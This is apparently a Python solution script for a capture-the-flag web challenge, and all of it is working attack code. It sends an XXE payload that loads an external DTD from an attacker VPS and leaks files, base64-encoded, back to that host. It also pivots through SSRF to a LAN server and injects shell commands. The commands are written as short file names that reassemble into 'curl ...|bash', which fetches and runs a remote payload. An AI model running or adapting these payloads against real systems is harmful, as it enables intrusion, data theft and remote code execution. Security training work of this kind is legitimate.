import requests
import urllib.parse
import time

url_vps = "http://xxx.xxx.xx.xxx"
url_chal = "http://bdctr.hgame.day-day.work/submit.php"
url_lan = "http://172.21.0.76/?token=xxx&v={}"
url_rm = "http://172.21.0.76/?token=xxx&r"
url_lan_t = ''
payload_vps = """<!ENTITY % payl SYSTEM 'php://filter/zlib.deflate/convert.base64-encode/resource={}'>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://xxx.xxx.xxx.xxx/?p=%payl;'>">
"""
payload_a = '<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://xxx.xxx.xxx.xxx/xxe.dtd">%remote;%int;%trick;]>'

def attack(payload_vps,payload):
    url_lan_t = url_lan.format(urllib.parse.quote(payload))
    data = {'a':payload_vps.format(url_lan_t)}
    requests.post(url_vps,data=data)
    time.sleep(0.5)
    requests.post(url_chal,data=payload_a)

def rm():
    data = {'a':payload_vps.format(url_rm)}
    requests.post(url_vps,data=data)
    time.sleep(0.5)
    requests.post(url_chal,data=payload_a)

rm()

# 将ls -t 写入文件_
cmd_list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>a",
    "ls>>_"
]

# curl 0.0.0.0|bash
cmd_list2=[
    ">bash",
    ">\|\\",
    ">0\\",
    ">0.\\",
    ">0.\\",
    ">0.\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]

for i in cmd_list:
    attack(payload_vps,str(i))
    time.sleep(1)

for i in cmd_list2:
    attack(payload_vps,str(i))
    time.sleep(1)

attack(payload_vps,"sh _")
time.sleep(1)
attack(payload_vps,"sh a")
